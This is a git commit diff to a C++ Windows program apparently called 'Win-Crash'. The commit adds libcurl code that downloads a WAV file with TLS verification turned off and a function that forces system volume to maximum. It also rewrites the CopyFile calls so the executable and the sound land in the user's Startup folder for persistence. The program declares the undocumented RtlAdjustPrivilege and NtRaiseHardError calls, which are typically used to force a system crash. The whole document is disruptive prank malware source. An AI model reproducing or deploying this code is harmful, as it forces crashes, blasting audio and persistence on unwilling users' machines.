d9262fc58abe10c05fbbbc62036f1e6f7cc0710f
Alphons <93847055+Crazypersonalph@users.noreply.github.com>
2023-11-04 11:56:12 +0800

    update

--- Makefile
+++ Makefile
@@ -1,2 +1,2 @@
 build:
-	x86_64-w64-mingw32-g++ src/main.cpp -o main.exe -lwinmm -lntdll -lstdc++ -static -std=c++17
+	g++ src/main.cpp -o bin/main.exe -static -DCURL_STATICLIB  -lwinmm -lntdll -lstdc++ -lcurl -lnghttp2 -lssh2 -lssh2 -lpsl -lbcrypt -ladvapi32 -lcrypt32 -lbcrypt -lssl -lcrypto -lssl -lcrypto -lgdi32 -lwldap32 -lzstd -lzstd -lbrotlidec -lbrotlidec -lz -lws2_32 -lbrotlidec -lbrotlicommon -lidn2 -L/mingw64/lib -liconv -L/mingw64/lib -lunistring -lole32 -loleaut32 -std=c++17
--- src/main.cpp
+++ src/main.cpp
@@ -1,15 +1,62 @@
+#include <winsock2.h>
 #include <windows.h>
 #include <iostream>
 #include <filesystem>
-
+#include <curl/curl.h>
+#include <Mmdeviceapi.h>
+#include <Endpointvolume.h>
 #pragma comment(lib, "ntdll.lib")
 
 EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
 
 EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
 
-int main(void)
+BOOL ChangeVolume(float nVolume)
 {
+    HRESULT hr = NULL;
+    IMMDeviceEnumerator *deviceEnumerator = NULL;
+    hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_INPROC_SERVER,
+                          __uuidof(IMMDeviceEnumerator), (LPVOID *)&deviceEnumerator);
+    if(FAILED(hr))
+        return FALSE;
+
+    IMMDevice *defaultDevice = NULL;
+    hr = deviceEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &defaultDevice);
+    deviceEnumerator->Release();
+    if(FAILED(hr))
+        return FALSE;
+
+    IAudioEndpointVolume *endpointVolume = NULL;
+    hr = defaultDevice->Activate(__uuidof(IAudioEndpointVolume),
+                                 CLSCTX_INPROC_SERVER, NULL, (LPVOID *)&endpointVolume);
+    defaultDevice->Release();
+    if(FAILED(hr))
+        return FALSE;
+
+    hr = endpointVolume->SetMasterVolumeLevelScalar(nVolume, NULL);
+    endpointVolume->Release();
+
+    return SUCCEEDED(hr);
+}
+
+int main(void){
+    FILE *fp;
+    CURL *curl;
+    fp = fopen("FX9eEhoRZhY.wav", "wb");
+    curl_global_init(CURL_GLOBAL_ALL);
+    curl = curl_easy_init();
+    if (curl) {
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
+        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
+        curl_easy_setopt(curl, CURLOPT_URL, "https://github.com/Crazypersonalph/Win-Crash/raw/audio-file/FX9eEhoRZhY.wav");
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, false);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, false);
+        curl_easy_perform(curl);
+        fclose(fp);
+        curl_easy_cleanup(curl);
+        curl_global_cleanup();
+    }
    std::string x;
    std::cout << "This software is licensed under the MIT license" << std::endl;
    std::cout << "The author of this software does not claim liability for any damages caused by the program, as per set out in the license." << std::endl;
@@ -21,6 +68,8 @@ int main(void)
       abort();
 
    }
+    CoInitialize(NULL);
+    ChangeVolume(1.0);
 
      char * user = getenv("username");
      int counter = 15;
@@ -29,10 +78,10 @@ int main(void)
      std::string sound = "FX9eEhoRZhY.wav";
      std::string final = startup + filename;
      std::string final1 = startup + sound;
-     CopyFile(final.c_str(), startup.c_str(),true);
-     CopyFile(final1.c_str(), startup.c_str(),true);
+     CopyFile(filename.c_str(), final.c_str(),true);
+     CopyFile(sound.c_str(), final1.c_str(),true);
      PlaySoundA("FX9eEhoRZhY.wav", NULL, SND_ASYNC | SND_FILENAME);
-
+    CoUninitialize();
      while (counter >= 1)
      {
         std::cout << "\rTime remaining: " << counter << std::endl;
